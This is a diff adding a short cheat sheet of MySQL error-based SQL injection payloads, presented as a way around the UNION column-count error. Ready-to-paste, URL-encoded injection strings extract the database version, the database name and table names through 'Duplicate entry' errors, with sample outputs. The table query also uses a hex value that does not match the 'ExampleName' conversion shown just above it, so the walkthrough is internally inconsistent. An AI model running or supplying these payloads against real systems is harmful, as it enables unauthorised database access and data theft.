@@ -1,0 +1,25 @@
+//Bypass for SQL Injection error "The used SELECT statements have a different number of columns"
+
+METHOD 1:
+
+**Retrieve database version:**
++OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1--+-
+
+Output with database version:
+Duplicate entry '5.7.29-log:1' for key ''
+
+**Retrieve database name:**
++AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -
+
+Output with database name:
+Duplicate entry 'ExampleName' for key ''
+
+**Retrieve tables:**
+https://magictool.ai/tool/text-to-hex-converter/
+First we convert the database name to 0xHEX: ExampleName -> **0x4578616d706c654e616d65**
+
+Given query will output the first table of the database:
++AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=**0x6c69746f666c6578**+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -
+
+
+
